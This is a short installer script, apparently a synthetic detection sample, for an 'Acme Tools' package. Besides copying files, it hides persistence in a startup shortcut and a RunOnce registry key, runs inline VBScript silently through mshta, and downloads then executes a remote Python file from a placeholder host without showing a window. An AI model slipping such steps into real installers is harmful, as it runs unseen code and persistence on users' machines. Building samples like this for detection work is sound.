; synthetic Inno Setup script
#define MyApp "Acme Tools"
[Setup]
AppName={#MyApp}
AppVersion=1.0
DefaultDirName={autopf}\Acme

[Files]
Source: "tool.exe"; DestDir: "{app}"; Flags: ignoreversion

[Dirs]
Name: "{app}\data"

[Icons]
Name: "{group}\{#MyApp}"; Filename: "{app}\tool.exe"
Name: "{userstartup}\acmesync"; Filename: "{sys}\wscript.exe"; Parameters: """{app}\sync.vbs"""

[Registry]
Root: HKLM; Subkey: "Software\Acme"; ValueType: string; ValueName: "Path"; ValueData: "{app}"
Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\RunOnce"; ValueType: string; ValueName: "acme"; ValueData: "node ""{app}\agent.js"""

[Run]
Filename: "{sys}\mshta.exe"; Parameters: "vbscript:Execute(""CreateObject(""""WScript.Shell"""").Run """"calc"""""")"; Flags: runhidden

[Code]
procedure CurStepChanged(CurStep: TSetupStep);
var
  rc: Integer;
begin
  if CurStep = ssPostInstall then
  begin
    DownloadTemporaryFile('https://acme.example.invalid/p.py', 'p.py', '', nil);
    Exec('python.exe', ExpandConstant('{tmp}\p.py'), '', SW_HIDE, ewWaitUntilTerminated, rc);
  end;
end;
